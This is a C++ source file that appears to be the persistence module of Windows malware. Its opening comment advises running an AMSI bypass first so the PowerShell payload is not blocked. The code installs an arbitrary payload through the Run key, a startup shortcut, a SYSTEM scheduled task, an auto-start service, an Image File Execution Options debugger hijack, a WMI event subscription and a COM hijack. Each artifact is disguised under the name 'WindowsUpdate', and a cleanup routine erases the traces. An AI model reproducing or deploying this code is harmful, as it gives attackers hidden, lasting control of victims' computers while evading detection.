// make sure to use amsi bypass before persistence, because in order for the powershell not to be raped on runtime, you need
// amsi bypass.

#include "persistence.h"
#include <ShlObj.h>
bool persistence::runkey(std::wstring payload) {
    HKEY hkey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (result != ERROR_SUCCESS) return false;
    result = RegSetValueExW(hkey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)payload.c_str(), (payload.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hkey);
    return result == ERROR_SUCCESS;
}
bool persistence::startupfolder(std::wstring payload) {
    wchar_t path[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path) != S_OK) return false;
    std::wstring startup = std::wstring(path) + L"\\WindowsUpdate.lnk";
    IShellLinkW* psl;
    IPersistFile* ppf;
    CoInitialize(NULL);
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl);
    if (SUCCEEDED(hr)) {
        psl->SetPath(payload.c_str());
        hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
        if (SUCCEEDED(hr)) {
            hr = ppf->Save(startup.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}
bool persistence::scheduledtask(std::wstring payload) {
    std::wstring cmd = L"schtasks /create /tn \"WindowsUpdate\" /tr \"" + payload + L"\" /sc onlogon /ru system /f";
    return _wsystem(cmd.c_str()) == 0;
}
bool persistence::serviceinstall(std::wstring payload) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;
    SC_HANDLE service = CreateServiceW(scm, L"WindowsUpdate", L"Windows Update Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, payload.c_str(), NULL, NULL, NULL, NULL, NULL);
    if (!service) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            service = OpenServiceW(scm, L"WindowsUpdate", SERVICE_ALL_ACCESS);
        }
        else {
            CloseServiceHandle(scm);
            return false;
        }
    }
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return true;
}
bool persistence::imagefileexec(std::wstring target, std::wstring payload) {
    HKEY hkey;
    std::wstring regpath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + target;
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regpath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL);
    if (result != ERROR_SUCCESS) return false;
    result = RegSetValueExW(hkey, L"Debugger", 0, REG_SZ, (BYTE*)payload.c_str(), (payload.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hkey);
    return result == ERROR_SUCCESS;
}
bool persistence::wmievent(std::wstring payload) {
    std::wstring wmi = L"powershell -Command \"$filter = Set-WmiInstance -Class __EventFilter -Namespace \\\"root\\subscription\\\" -Arguments @{Name=\\\"WindowsUpdateFilter\\\";EventNamespace=\\\"root\\cimv2\\\";QueryLanguage=\\\"WQL\\\";Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\\"}; ";
    wmi += L"$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \\\"root\\subscription\\\" -Arguments @{Name=\\\"WindowsUpdateConsumer\\\";CommandLineTemplate=\\\"" + payload + L"\\\"}; ";
    wmi += L"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \\\"root\\subscription\\\" -Arguments @{Filter=$filter;Consumer=$consumer}\"";
    return _wsystem(wmi.c_str()) == 0;
}
bool persistence::comhijack(std::wstring clsid, std::wstring payload) {
    HKEY hkey;
    std::wstring regpath = L"SOFTWARE\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
    LONG result = RegCreateKeyExW(HKEY_CURRENT_USER, regpath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hkey, NULL);
    if (result != ERROR_SUCCESS) return false;
    result = RegSetValueExW(hkey, L"", 0, REG_SZ, (BYTE*)payload.c_str(), (payload.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hkey);
    return result == ERROR_SUCCESS;
}
bool persistence::multiple(std::wstring payload) {
    bool success = false;
    if (runkey(payload)) success = true;
    if (startupfolder(payload)) success = true;
    if (scheduledtask(payload)) success = true;
    return success;
}
bool persistence::cleanup() {
    bool success = true;
    HKEY hkey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey) == ERROR_SUCCESS) {
        RegDeleteValueW(hkey, L"WindowsUpdate");
        RegCloseKey(hkey);
    }
    wchar_t path[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path) == S_OK) {
        std::wstring startup = std::wstring(path) + L"\\WindowsUpdate.lnk";
        DeleteFileW(startup.c_str());
    }
    system("schtasks /delete /tn \"WindowsUpdate\" /f");
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE service = OpenServiceW(scm, L"WindowsUpdate", SERVICE_ALL_ACCESS);
        if (service) {
            DeleteService(service);
            CloseServiceHandle(service);
        }
        CloseServiceHandle(scm);
    }
    return success;
}